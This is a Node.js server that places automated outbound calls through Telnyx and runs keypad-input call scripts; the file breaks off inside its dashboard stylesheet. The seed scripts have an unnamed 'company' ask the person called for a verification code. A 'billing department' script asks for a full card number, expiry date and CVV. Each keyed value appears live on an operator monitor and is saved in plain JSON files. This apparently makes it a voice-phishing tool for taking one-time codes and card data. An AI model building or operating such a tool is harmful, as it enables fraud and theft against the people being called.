require("dotenv").config();
const express = require("express");
const cors    = require("cors");
const fs      = require("fs");
const path    = require("path");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cors());

// Handle both GET params and POST body for TwiML routes
app.use("/twiml", (req, res, next) => {
  if (req.method === "GET") {
    req.body = req.query; // For GET requests, use query params as body
  }
  // Telnyx uses call_control_id as the call identifier
  if (req.body && req.body.call_control_id && !req.body.CallSid) {
    req.body.CallSid = req.body.call_control_id;
  }
  // Telnyx status values
  if (req.body && req.body.call_status && !req.body.CallStatus) {
    req.body.CallStatus = req.body.call_status;
  }
  if (req.body && req.body.call_duration && !req.body.CallDuration) {
    req.body.CallDuration = req.body.call_duration;
  }
  next();
});

// ── ID generator ──────────────────────────────────────────────────────────────
function uid() { return Date.now().toString(36) + Math.random().toString(36).slice(2,7); }

// ── Simple file storage ───────────────────────────────────────────────────────
const F = {
  settings: path.join(__dirname, "_settings.json"),
  scripts:  path.join(__dirname, "_scripts.json"),
  logs:     path.join(__dirname, "_logs.json"),
};
function fread(f, def) {
  try { if (fs.existsSync(f)) return JSON.parse(fs.readFileSync(f,"utf8")); } catch(e) {}
  return def;
}
function fwrite(f, d) { try { fs.writeFileSync(f, JSON.stringify(d)); } catch(e) { console.error("write err",e.message); } }

// ── Defaults ──────────────────────────────────────────────────────────────────
const DEF_SETTINGS = {
  apiKey: "", connectionId: "", fromNumber: "", baseUrl: "",
  voice: "en-US-Standard-B", language: "en-US", companyName: "My Company"
};

const SEED_SCRIPTS = [
  {
    id:"s-default", name:"Default Script", isDefault:true, createdAt:"2024-01-01T00:00:00Z",
    greeting:{ message:"Hello! This is a call from our company. Press 1 to continue, or press 2 to end this call.", timeout:10, noInputMessage:"We did not receive your input. Goodbye." },
    steps:[{ label:"Verification Code", message:"Please enter your 5-digit code, then press hash.", maxDigits:5, timeout:15, confirmMessage:"Thank you. " }],
    successMessage:"Thank you. Your information has been received. Goodbye.",
    cancelMessage:"No problem. Goodbye.",
    errorMessage:"We did not receive your input. Goodbye."
  },
  {
    id:"s-payment", name:"Payment Collection", isDefault:false, createdAt:"2024-01-01T00:00:00Z",
    greeting:{ message:"Hello! This is our billing department. Press 1 to proceed with payment, or press 2 to call back later.", timeout:10, noInputMessage:"We did not receive your input. Goodbye." },
    steps:[
      { label:"Card Number", message:"Please enter your 16-digit card number, then press hash.", maxDigits:16, timeout:30, confirmMessage:"Thank you. " },
      { label:"Expiry Date", message:"Please enter your card expiry date, month then year, then press hash.", maxDigits:4, timeout:15, confirmMessage:"Thank you. " },
      { label:"CVV", message:"Please enter your 3-digit security code, then press hash.", maxDigits:3, timeout:15, confirmMessage:"Thank you. " }
    ],
    successMessage:"Thank you. Your payment details have been received. Goodbye.",
    cancelMessage:"No problem. Please call us back when ready. Goodbye.",
    errorMessage:"We did not receive your input. Goodbye."
  },
  {
    id:"s-survey", name:"Customer Survey", isDefault:false, createdAt:"2024-01-01T00:00:00Z",
    greeting:{ message:"Hello! We would like your feedback. Press 1 to continue, or press 2 to skip.", timeout:10, noInputMessage:"We did not receive your input. Goodbye." },
    steps:[
      { label:"Satisfaction Score", message:"On a scale of 1 to 5, how satisfied are you? Press 1 for very unhappy, 5 for very happy.", maxDigits:1, timeout:15, confirmMessage:"Thank you. " },
      { label:"Would Recommend", message:"Press 1 if you would recommend us to a friend, or press 2 if not.", maxDigits:1, timeout:15, confirmMessage:"Got it. " }
    ],
    successMessage:"Thank you for your feedback! Goodbye.",
    cancelMessage:"No problem. Have a great day! Goodbye.",
    errorMessage:"We did not receive your input. Goodbye."
  }
];

function loadSettings() { return { ...DEF_SETTINGS, ...fread(F.settings, {}) }; }
function saveSettings(d) { fwrite(F.settings, d); }

function loadScripts() {
  const saved = fread(F.scripts, null);
  if (!saved || !saved.length) return JSON.parse(JSON.stringify(SEED_SCRIPTS));
  const seedIds = SEED_SCRIPTS.map(s=>s.id);
  const userScripts = saved.filter(s=>!seedIds.includes(s.id));
  return [...JSON.parse(JSON.stringify(SEED_SCRIPTS)), ...userScripts];
}
function saveScripts(arr) {
  const seedIds = SEED_SCRIPTS.map(s=>s.id);
  fwrite(F.scripts, arr.filter(s=>!seedIds.includes(s.id)));
}

function loadLogs() { return fread(F.logs, []); }
function saveLogs(arr) { fwrite(F.logs, arr); }

// ── Auto-detect public URL ─────────────────────────────────────────────────────
let _detectedUrl = "";
function publicUrl(req) {
  if (_detectedUrl) return _detectedUrl;
  const proto = req.headers["x-forwarded-proto"] || "https";
  const host  = req.headers["x-forwarded-host"] || req.headers["host"] || "";
  if (host) { _detectedUrl = proto + "://" + host; }
  return _detectedUrl;
}

// ── In-memory call sessions ────────────────────────────────────────────────────
const sessions = {};
function syncLog(s) {
  const logs = loadLogs();
  const i = logs.findIndex(l => l.callSid === s.callSid);
  if (i >= 0) logs[i] = { ...logs[i], ...s }; else logs.unshift(s);
  saveLogs(logs);
}

// ── Make Telnyx call ──────────────────────────────────────────────────────────
async function makeTelnyxCall(ctx, to, twimlUrl, statusUrl) {
  const body = {
    to: to,
    from: ctx.fromNumber,
    connection_id: ctx.connectionId,
    webhook_url: statusUrl,
    webhook_url_method: "POST",
    answering_machine_detection: "disabled"
  };
  const res = await fetch("https://api.telnyx.com/v2/calls", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": "Bearer " + ctx.apiKey
    },
    body: JSON.stringify(body)
  });
  const d = await res.json();
  if (!res.ok) throw new Error(d.errors?.[0]?.detail || JSON.stringify(d));
  return d.data?.call_control_id || uid();
}

// ═══════════════════════════════════════════════════════════
//  API ROUTES
// ═══════════════════════════════════════════════════════════

// Settings
app.get("/api/settings", (req,res) => {
  const s = loadSettings();
  const safe = { ...s };
  if (safe.apiKey && safe.apiKey.length > 8) safe.apiKey = "••••" + safe.apiKey.slice(-4);
  res.json(safe);
});

app.post("/api/settings", (req,res) => {
  const cur = loadSettings();
  const body = req.body;
  const updated = { ...cur, ...body };
  if (body.apiKey && body.apiKey.startsWith("••••")) updated.apiKey = cur.apiKey;
  saveSettings(updated);
  if (body.baseUrl) _detectedUrl = body.baseUrl;
  res.json({ success: true });
});

// Test connection
app.get("/api/test", async (req,res) => {
  const s = loadSettings();
  if (!s.apiKey) return res.json({ ok:false, error:"API Key not set. Go to Settings." });
  if (!s.fromNumber) return res.json({ ok:false, error:"Phone number not set. Go to Settings." });
  if (!s.connectionId) return res.json({ ok:false, error:"Connection ID not set. Go to Settings." });
  try {
    const r = await fetch("https://api.telnyx.com/v2/phone_numbers?filter[phone_number]=" + encodeURIComponent(s.fromNumber), {
      headers: { "Authorization": "Bearer " + s.apiKey }
    });
    const d = await r.json();
    if (!r.ok) return res.json({ ok:false, error: d.errors?.[0]?.detail || "Auth failed" });
    res.json({ ok:true, message:"Telnyx connected ✓", number: s.fromNumber });
  } catch(e) { res.json({ ok:false, error: e.message }); }
});

// Scripts
app.get("/api/scripts", (req,res) => res.json(loadScripts()));

app.post("/api/scripts", (req,res) => {
  const all = loadScripts();
  const body = req.body;
  const seedIds = SEED_SCRIPTS.map(s=>s.id);
  if (body.id && !seedIds.includes(body.id)) {
    const i = all.findIndex(s=>s.id===body.id);
    if (i>=0) all[i] = { ...all[i], ...body, updatedAt: new Date().toISOString() };
    else all.push({ ...body, createdAt: new Date().toISOString() });
  } else if (!body.id) {
    all.push({ ...body, id: uid(), createdAt: new Date().toISOString() });
  }
  saveScripts(all);
  res.json({ success:true, scripts: loadScripts() });
});

app.delete("/api/scripts/:id", (req,res) => {
  const seedIds = SEED_SCRIPTS.map(s=>s.id);
  if (seedIds.includes(req.params.id)) return res.status(400).json({ error:"Cannot delete a template script." });
  const all = loadScripts().filter(s=>s.id !== req.params.id);
  saveScripts(all);
  res.json({ success:true, scripts: loadScripts() });
});

app.post("/api/scripts/:id/setdefault", (req,res) => {
  const all = loadScripts();
  all.forEach(s => s.isDefault = s.id === req.params.id);
  saveScripts(all);
  res.json({ success:true });
});

// Logs
app.get("/api/logs", (req,res) => res.json(loadLogs()));
app.delete("/api/logs/:id", (req,res) => { saveLogs(loadLogs().filter(l=>l.id!==req.params.id)); res.json({success:true}); });
app.delete("/api/logs", (req,res) => { saveLogs([]); res.json({success:true}); });

// Sessions
app.get("/api/sessions", (req,res) => {
  res.json(Object.values(sessions).sort((a,b)=>new Date(b.startTime)-new Date(a.startTime)));
});

// Make call
app.post("/api/call", async (req,res) => {
  const { phoneNumber, label, scriptId } = req.body;
  if (!phoneNumber) return res.status(400).json({ error:"Phone number required." });
  const s = loadSettings();
  if (!s.apiKey) return res.status(400).json({ error:"Telnyx API Key not set. Go to Settings." });
  if (!s.connectionId) return res.status(400).json({ error:"Telnyx Connection ID not set. Go to Settings." });
  if (!s.fromNumber) return res.status(400).json({ error:"From phone number not set. Go to Settings." });
  const scripts = loadScripts();
  const script = (scriptId ? scripts.find(x=>x.id===scriptId) : null) || scripts.find(x=>x.isDefault) || scripts[0];
  const base = s.baseUrl || publicUrl(req);
  if (!base) return res.status(400).json({ error:"Server URL unknown. Save it in Settings." });
  try {
    const callSid = await makeTelnyxCall(s, phoneNumber, base+"/twiml/start?sid="+script.id, base+"/twiml/status");
    const entry = {
      id: uid(), callSid, phone: phoneNumber, label: label||"Call",
      scriptName: script.name, provider:"telnyx",
      status:"initiated", statusDetail:"Dialing...",
      startTime: new Date().toISOString(), endTime:null, duration:null,
      currentStep:-1, collected:[], steps: script.steps.length
    };
    sessions[callSid] = entry;
    const logs = loadLogs(); logs.unshift(entry); saveLogs(logs);
    res.json({ success:true, callSid });
  } catch(e) { res.status(500).json({ error: e.message }); }
});

// End call
app.post("/api/call/:sid/end", async (req,res) => {
  const s = loadSettings();
  try {
    await fetch("https://api.telnyx.com/v2/calls/"+req.params.sid+"/actions/hangup", {
      method:"POST", headers:{ "Authorization":"Bearer "+s.apiKey, "Content-Type":"application/json" }
    });
    if (sessions[req.params.sid]) {
      sessions[req.params.sid].status = "ended-by-user";
      sessions[req.params.sid].statusDetail = "Ended by you";
      syncLog(sessions[req.params.sid]);
    }
    res.json({ success:true });
  } catch(e) { res.status(500).json({ error:e.message }); }
});

// ══════════════════════════════════════════════════════════
//  TWIML ROUTES (Telnyx supports Twilio-compatible TwiML)
// ══════════════════════════════════════════════════════════
function getVoice() {
  const s = loadSettings();
  return { voice: s.voice || "en-US-Standard-B", language: s.language || "en-US" };
}
function getBase(req) {
  const s = loadSettings();
  if (s.baseUrl) return s.baseUrl;
  const proto = req.headers["x-forwarded-proto"] || "https";
  const host  = req.headers["x-forwarded-host"] || req.headers["host"] || "";
  return host ? proto + "://" + host : "";
}
function getScript(id) {
  const all = loadScripts();
  return (id ? all.find(s=>s.id===id) : null) || all.find(s=>s.isDefault) || all[0];
}

app.all("/twiml/start", (req,res) => {
  const { voice:v, language:l } = getVoice();
  const sc = getScript(req.query.sid);
  const base = getBase(req);
  const sid = req.body.CallSid;
  if (sessions[sid]) { sessions[sid].status="ringing"; sessions[sid].statusDetail="Playing greeting..."; syncLog(sessions[sid]); }
  const { VoiceResponse } = require("twilio").twiml;
  const t = new VoiceResponse();
  const g = t.gather({ numDigits:1, action:base+"/twiml/greet?sid="+sc.id, method:"POST", timeout:sc.greeting.timeout||10 });
  g.say({ voice:v, language:l }, sc.greeting.message || "Hello, press 1 to continue or 2 to end.");
  t.say({ voice:v, language:l }, sc.greeting.noInputMessage || "We did not receive your input. Goodbye.");
  t.hangup();
  res.type("text/xml").send(t.toString());
});

app.all("/twiml/greet", (req,res) => {
  const { voice:v, language:l } = getVoice();
  const sc = getScript(req.query.sid);
  const base = getBase(req);
  const sid = req.body.CallSid;
  const digit = req.body.Digits;
  const { VoiceResponse } = require("twilio").twiml;
  const t = new VoiceResponse();
  if (digit === "2") {
    if (sessions[sid]) { sessions[sid].status="cancelled"; sessions[sid].statusDetail="Caller declined"; syncLog(sessions[sid]); }
    t.say({ voice:v, language:l }, sc.cancelMessage); t.hangup();
    return res.type("text/xml").send(t.toString());
  }
  if (digit === "1") {
    if (sessions[sid]) { sessions[sid].status="in-progress"; sessions[sid].statusDetail="Accepted"; syncLog(sessions[sid]); }
    return res.redirect(307, base+"/twiml/step/0?sid="+sc.id);
  }
  t.say({ voice:v, language:l }, "Invalid input. " + sc.greeting.message);
  t.redirect(base+"/twiml/start?sid="+sc.id);
  res.type("text/xml").send(t.toString());
});

app.all("/twiml/step/:idx", (req,res) => {
  const { voice:v, language:l } = getVoice();
  const sc = getScript(req.query.sid);
  const base = getBase(req);
  const idx = parseInt(req.params.idx, 10);
  const step = sc.steps[idx];
  const sid = req.body.CallSid;
  const { VoiceResponse } = require("twilio").twiml;
  const t = new VoiceResponse();
  if (!step) {
    if (sessions[sid]) { sessions[sid].status="completed"; sessions[sid].statusDetail="All steps done"; syncLog(sessions[sid]); }
    t.say({ voice:v, language:l }, sc.successMessage); t.hangup();
    return res.type("text/xml").send(t.toString());
  }
  if (sessions[sid]) { sessions[sid].currentStep=idx; sessions[sid].statusDetail="Waiting: "+step.label; syncLog(sessions[sid]); }
  const g = t.gather({ numDigits:step.maxDigits, finishOnKey:"#", action:base+"/twiml/collect/"+idx+"?sid="+sc.id, method:"POST", timeout:step.timeout||15 });
  g.say({ voice:v, language:l }, step.message);
  t.say({ voice:v, language:l }, sc.errorMessage);
  t.hangup();
  res.type("text/xml").send(t.toString());
});

app.all("/twiml/collect/:idx", (req,res) => {
  const { voice:v, language:l } = getVoice();
  const sc = getScript(req.query.sid);
  const base = getBase(req);
  const idx = parseInt(req.params.idx, 10);
  const sid = req.body.CallSid;
  const digits = req.body.Digits;
  const step = sc.steps[idx];
  const { VoiceResponse } = require("twilio").twiml;
  const t = new VoiceResponse();
  if (sessions[sid]) {
    sessions[sid].collected.push({ step:idx, label:step.label, value:digits, time:new Date().toISOString() });
    sessions[sid].currentStep = idx+1;
    sessions[sid].statusDetail = "Received: " + step.label;
    syncLog(sessions[sid]);
  }
  if (step.confirmMessage) t.say({ voice:v, language:l }, step.confirmMessage);
  t.redirect(base+"/twiml/step/"+(idx+1)+"?sid="+sc.id);
  res.type("text/xml").send(t.toString());
});

app.all("/twiml/status", (req,res) => {
  const sid = req.body.CallSid;
  const cs  = req.body.CallStatus;
  const dur = req.body.CallDuration;
  if (sessions[sid]) {
    const s = sessions[sid];
    if (cs==="ringing") s.statusDetail="Ringing...";
    else if (cs==="answered") { s.status="in-progress"; s.statusDetail="Connected"; }
    else if (cs==="completed" && !["cancelled","completed","ended-by-user"].includes(s.status)) { s.status="completed"; s.statusDetail="Completed"; }
    else if (["no-answer","busy","failed"].includes(cs)) { s.status=cs; s.statusDetail=cs.replace("-"," "); }
    if (dur) s.duration = parseInt(dur);
    if (["completed","cancelled","no-answer","busy","failed"].includes(cs)) s.endTime = new Date().toISOString();
    syncLog(s);
  }
  res.sendStatus(200);
});

// ══════════════════════════════════════════════════════════
//  DASHBOARD HTML
// ══════════════════════════════════════════════════════════
const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<title>IVR Pro — Telnyx</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"/>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#f0f4f8;--panel:#ffffff;--panel2:#f7f9fc;
  --border:#e2e8f0;--border2:#cbd5e1;
  --dark:#0f172a;--dark2:#1e293b;
  --cyan:#0ea5e9;--cyan2:#0284c7;
  --green:#10b981;--green2:#059669;
  --amber:#f59e0b;--red:#ef4444;--purple:#8b5cf6;
  --text:#0f172a;--text2:#475569;--text3:#94a3b8;
  --font:'Inter',sans-serif;--mono:'JetBrains Mono',monospace;
}
html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--font)}
button,input,select,textarea{font-family:var(--font)}
::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--border2);border-radius:10px}

.app{display:flex;height:100vh;overflow:hidden}

/* SIDEBAR */
.sidebar{width:280px;min-width:280px;background:var(--dark);display:flex;flex-direction:column;overflow-y:auto;overflow-x:hidden}
.logo{padding:20px;border-bottom:1px solid #1e293b;display:flex;align-items:center;gap:12px}
.logo-icon{width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,var(--cyan),var(--cyan2));display:flex;align-items:center;justify-content:center;flex-shrink:0}
.logo-icon svg{width:20px;height:20px}
.logo-name{font-size:17px;font-weight:700;color:#fff;letter-spacing:-0.3px}
.logo-sub{font-size:10px;color:#64748b;margin-top:1px;text-transform:uppercase;letter-spacing:1px}

.dialer{padding:16px;border-bottom:1px solid #1e293b}
.s-label{font-size:10px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:#64748b;margin-bottom:10px}
.field{margin-bottom:10px}
.field label{display:block;font-size:11px;font-weight:500;color:#94a3b8;margin-bottom:4px}
.field input,.field select{width:100%;background:#1e293b;border:1px solid #334155;border-radius:8px;padding:9px 11px;color:#f1f5f9;font-size:13px;outline:none;transition:border-color .15s}
.field input:focus,.field select:focus{border-color:var(--cyan)}
.field input::placeholder{color:#475569}
.field select option{background:#1e293b}
.btn-call{width:100%;padding:12px;border:none;border-radius:10px;background:linear-gradient(135deg,var(--cyan),var(--cyan2));color:#fff;font-size:14px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:all .15s;margin-top:6px;letter-spacing:.3px}
.btn-call:hover{opacity:.9;transform:translateY(-1px)}
.btn-call:disabled{opacity:.4;cursor:not-allowed;transform:none}
.key-btn{background:#1e293b;border:1px solid #334155;border-radius:8px;color:#f1f5f9;padding:8px 4px;cursor:pointer;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:0;transition:all .15s;min-height:44px}
.key-btn:hover{background:#334155;border-color:#475569}
.key-btn span{font-size:16px;font-weight:600;line-height:1}
.key-btn small{font-size:8px;color:#64748b;letter-spacing:1px;margin-top:1px}
.btn-test{width:100%;margin-top:6px;padding:8px;background:transparent;border:1px solid #334155;border-radius:8px;color:#94a3b8;font-size:12px;cursor:pointer;transition:all .15s}
.btn-test:hover{border-color:var(--cyan);color:var(--cyan)}
.msg{margin-top:8px;padding:9px 12px;border-radius:8px;font-size:12px;font-weight:500;display:none;line-height:1.5}
.msg.err{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:var(--red);display:block}
.msg.ok{background:rgba(16,185,129,.1);border:1px solid rgba(16,185,129,.3);color:var(--green);display:block}
.msg.info{background:rgba(14,165,233,.1);border:1px solid rgba(14,165,233,.3);color:var(--cyan);display:block}

.stats{padding:14px 16px;border-bottom:1px solid #1e293b}
.stats-row{display:flex;gap:6px}
.stat{flex:1;background:#1e293b;border-radius:10px;padding:10px 6px;text-align:center}
.stat-n{font-size:22px;font-weight:700;letter-spacing:-0.5px}
.stat-l{font-size:9px;color:#64748b;text-transform:uppercase;letter-spacing:.5px;margin-top:2px}
.live-pill{margin-top:10px;padding:6px 12px;background:rgba(16,185,129,.08);border:1px solid rgba(16,185,129,.2);border-radius:20px;display:flex;align-items:center;gap:7px;font-size:10px;color:var(--green)}
.dot{width:5px;height:5px;border-radius:50%;background:var(--green);animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}

/* MAIN */
.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
.tabs{display:flex;background:var(--panel);border-bottom:2px solid var(--border);padding:0 24px;gap:4px}
.tab{padding:14px 18px;font-size:13px;font-weight:600;color:var(--text2);border:none;background:none;border-bottom:3px solid transparent;cursor:pointer;transition:all .15s;margin-bottom:-2px;white-space:nowrap}
.tab:hover{color:var(--text)}
.tab.active{color:var(--cyan2);border-bottom-color:var(--cyan)}
.panel{flex:1;overflow-y:auto;display:none;padding:24px}
.panel.active{display:block}
.ph{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:20px}
.ph-title{font-size:20px;font-weight:700}
.ph-sub{font-size:12px;color:var(--text2);margin-top:2px}

/* MONITOR */
.mon-grid{display:flex;flex-direction:column;gap:12px}
.empty{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:80px 20px;color:var(--text3);text-align:center}
.empty svg{opacity:.2;margin-bottom:16px}
.empty-t{font-size:15px;font-weight:600;color:var(--text2);margin-bottom:6px}
.empty-s{font-size:13px;line-height:1.6}

.ccard{background:var(--panel);border:1px solid var(--border);border-radius:14px;overflow:hidden;transition:border-color .2s;box-shadow:0 2px 8px rgba(0,0,0,.06)}
.ccard.s-in-progress{border-color:var(--cyan2)}
.ccard.s-completed{border-color:var(--green2)}
.ccard.s-cancelled,.ccard.s-failed,.ccard.s-no-answer,.ccard.s-busy,.ccard.s-ended-by-user{border-color:rgba(239,68,68,.4)}
.ch{padding:14px 18px;display:flex;justify-content:space-between;align-items:flex-start;border-bottom:1px solid var(--border)}
.cphone{font-size:17px;font-weight:700;font-family:var(--mono)}
.clabel{font-size:11px;color:var(--text2);margin-top:3px}
.cr{display:flex;flex-direction:column;align-items:flex-end;gap:5px}
.ctime{font-size:10px;color:var(--text3)}
.badge{display:inline-flex;align-items:center;gap:4px;padding:3px 9px;border-radius:20px;font-size:10px;font-weight:700;text-transform:uppercase}
.bdot{width:5px;height:5px;border-radius:50%;background:currentColor}
.bdot-p{animation:pulse 1s infinite}
.badge-initiated,.badge-ringing{background:rgba(245,158,11,.12);color:var(--amber)}
.badge-in-progress{background:rgba(14,165,233,.12);color:var(--cyan2)}
.badge-completed{background:rgba(16,185,129,.12);color:var(--green2)}
.badge-cancelled,.badge-failed,.badge-no-answer,.badge-busy,.badge-ended-by-user{background:rgba(239,68,68,.1);color:var(--red)}
.cb{padding:14px 18px}
.prog{display:flex;gap:5px;margin-bottom:12px}
.pseg{height:4px;flex:1;border-radius:2px;background:var(--border2);transition:background .3s}
.pseg.done{background:var(--green)}
.pseg.act{background:var(--cyan);animation:blink 1s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
.coll-list{display:flex;flex-direction:column;gap:6px}
.ci{display:flex;align-items:center;gap:10px;background:var(--panel2);border:1px solid var(--border);border-radius:8px;padding:8px 12px}
.ci-l{font-size:10px;color:var(--text2);flex:1;text-transform:uppercase;letter-spacing:.5px;font-weight:600}
.ci-v{font-family:var(--mono);font-size:15px;font-weight:600;color:var(--cyan2);background:rgba(14,165,233,.08);padding:2px 9px;border-radius:5px;letter-spacing:2px}
.ci-t{font-size:10px;color:var(--text3)}
.cf{display:flex;align-items:center;justify-content:space-between;padding:10px 18px;border-top:1px solid var(--border);background:var(--panel2)}
.cf-txt{font-size:11px;color:var(--text2)}
.cf-btns{display:flex;gap:6px}
.btn-sm{padding:5px 12px;border-radius:7px;font-size:11px;font-weight:600;border:1px solid var(--border2);background:none;color:var(--text2);cursor:pointer;transition:all .15s}
.btn-sm:hover{border-color:var(--cyan);color:var(--cyan)}
.btn-sm.end{border-color:rgba(239,68,68,.4);color:var(--red)}
.btn-sm.end:hover{background:rgba(239,68,68,.08)}
.sline{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--text2);margin-top:8px}
.sdot{width:6px;height:6px;border-radius:50%;background:var(--amber);display:inline-block}
.sdot.a{animation:pulse 1s infinite}

/* SCRIPTS */
.slib{display:flex;gap:10px;margin-bottom:18px;overflow-x:auto;padding-bottom:4px;flex-wrap:nowrap}
.scard{background:var(--panel);border:2px solid var(--border);border-radius:12px;padding:14px;min-width:160px;max-width:160px;cursor:pointer;transition:all .15s;flex-shrink:0;box-shadow:0 2px 6px rgba(0,0,0,.05)}
.scard:hover{border-color:var(--border2);transform:translateY(-2px)}
.scard.sel{border-color:var(--cyan2);background:#f0f9ff}
.scard.is-default .scard-name::after{content:" ★";color:var(--amber);font-size:11px}
.scard-t{display:flex;align-items:center;gap:5px;margin-bottom:3px}
.scard-name{font-size:13px;font-weight:700}
.scard-tag{font-size:8px;font-weight:700;padding:1px 5px;border-radius:3px;background:rgba(14,165,233,.1);color:var(--cyan2);text-transform:uppercase}
.scard-meta{font-size:10px;color:var(--text3)}
.scard-btns{display:flex;gap:4px;margin-top:10px}
.btn-sc{padding:3px 8px;border-radius:5px;font-size:10px;font-weight:600;border:1px solid var(--border2);background:none;color:var(--text2);cursor:pointer;transition:all .15s}
.btn-sc:hover{border-color:var(--cyan2);color:var(--cyan2)}
.btn-sc.def{border-color:rgba(245,158,11,.4);color:var(--amber)}
.btn-sc.del:hover{border-color:var(--red);color:var(--red)}
.scard-new{border-style:dashed;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:5px;color:var(--text3)}
.scard-new:hover{border-color:var(--cyan2);color:var(--cyan2);background:rgba(14,165,233,.04)}

.sec{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:18px;margin-bottom:14px;box-shadow:0 2px 6px rgba(0,0,0,.04)}
.sec-title{font-size:14px;font-weight:700;margin-bottom:14px;display:flex;align-items:center;gap:8px}
.sec-title::before{content:'';display:inline-block;width:3px;height:16px;background:var(--cyan2);border-radius:2px}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.full{grid-column:1/-1}
.ff{display:flex;flex-direction:column;gap:4px}
.ff label{font-size:11px;font-weight:600;color:var(--text2)}
.ff input,.ff select,.ff textarea{background:var(--panel2);border:1px solid var(--border);border-radius:8px;padding:9px 11px;color:var(--text);font-size:13px;outline:none;resize:vertical;transition:border-color .15s}
.ff textarea{min-height:64px;line-height:1.5}
.ff input:focus,.ff select:focus,.ff textarea:focus{border-color:var(--cyan2)}
.ff input::placeholder,.ff textarea::placeholder{color:var(--text3)}

.step-card{background:var(--panel2);border:1px solid var(--border);border-radius:10px;padding:14px;margin-bottom:8px}
.step-hd{display:flex;align-items:center;gap:8px;margin-bottom:12px}
.step-n{width:24px;height:24px;border-radius:50%;background:var(--cyan2);color:#fff;font-size:10px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.step-name{flex:1;background:transparent;border:none;border-bottom:1px solid var(--border);color:var(--text);font-size:13px;font-weight:700;padding:2px 0;outline:none;transition:border-color .15s}
.step-name:focus{border-bottom-color:var(--cyan2)}
.btn-rm{background:none;border:none;color:var(--text3);font-size:18px;cursor:pointer;padding:0 3px;transition:color .15s;line-height:1}
.btn-rm:hover{color:var(--red)}
.sg{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.sf{display:flex;flex-direction:column;gap:3px}
.sf.full{grid-column:1/-1}
.sf label{font-size:10px;font-weight:600;color:var(--text3);text-transform:uppercase;letter-spacing:.5px}
.sf input,.sf textarea{background:var(--panel);border:1px solid var(--border);border-radius:7px;padding:7px 10px;color:var(--text);font-size:12px;outline:none;resize:vertical;transition:border-color .15s}
.sf input:focus,.sf textarea:focus{border-color:var(--cyan2)}
.sf input::placeholder,.sf textarea::placeholder{color:var(--text3)}

.btn-add{width:100%;padding:9px;background:none;border:2px dashed var(--border);border-radius:8px;color:var(--text2);font-size:12px;cursor:pointer;transition:all .15s;margin-bottom:4px}
.btn-add:hover{border-color:var(--cyan2);color:var(--cyan2)}
.sname-bar{display:flex;gap:8px;align-items:center;margin-bottom:16px}
.sname-inp{flex:1;background:var(--panel);border:2px solid var(--border);border-radius:9px;padding:10px 14px;color:var(--text);font-size:17px;font-weight:700;outline:none;transition:border-color .15s}
.sname-inp:focus{border-color:var(--cyan2)}
.save-row{display:flex;align-items:center;gap:10px;margin-top:16px}
.btn-save{padding:10px 22px;background:var(--cyan2);color:#fff;border:none;border-radius:9px;font-size:13px;font-weight:700;cursor:pointer;transition:all .15s}
.btn-save:hover{background:var(--cyan);transform:translateY(-1px)}
.btn-save.sec2{background:var(--panel);border:2px solid var(--cyan2);color:var(--cyan2)}
.btn-save.sec2:hover{background:rgba(14,165,233,.06)}
.saved-ok{font-size:12px;color:var(--green2);display:none;font-weight:600}
.saved-ok.on{display:block}

/* LOGS */
.btn-danger{padding:7px 16px;background:none;border:1px solid rgba(239,68,68,.4);border-radius:7px;color:var(--red);font-size:12px;font-weight:600;cursor:pointer;transition:all .15s}
.btn-danger:hover{background:rgba(239,68,68,.06)}
.log-wrap{background:var(--panel);border:1px solid var(--border);border-radius:12px;overflow:hidden}
.log-table{width:100%;border-collapse:collapse}
.log-table th{font-size:10px;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:.8px;padding:10px 14px;text-align:left;background:var(--panel2);border-bottom:1px solid var(--border)}
.log-table td{padding:10px 14px;border-bottom:1px solid var(--border);font-size:12px;vertical-align:middle}
.log-table tr:last-child td{border-bottom:none}
.log-table tr:hover td{background:var(--panel2)}
.no-data{text-align:center;padding:50px;color:var(--text3);font-size:13px}
.det-btn{color:var(--cyan2);font-size:11px;cursor:pointer;font-weight:600;background:none;border:none;padding:0}
.det-btn:hover{text-decoration:underline}
.det-row{display:none}
.det-row.on{display:table-row}
.det-cell{padding:10px 14px!important;background:var(--panel2);border-bottom:1px solid var(--border)}
.chips{display:flex;flex-wrap:wrap;gap:8px}
.chip{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:8px 12px}
.chip-l{font-size:9px;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:.5px}
.chip-v{font-family:var(--mono);font-size:14px;color:var(--cyan2);margin-top:3px;letter-spacing:1px}
.dur{font-family:var(--mono);font-size:11px;color:var(--text2)}

/* SETTINGS */
.note{font-size:10px;color:var(--text3);margin-top:4px;line-height:1.5}
.note a{color:var(--cyan2);text-decoration:none}
.note a:hover{text-decoration:underline}
.url-row{display:flex;gap:6px}
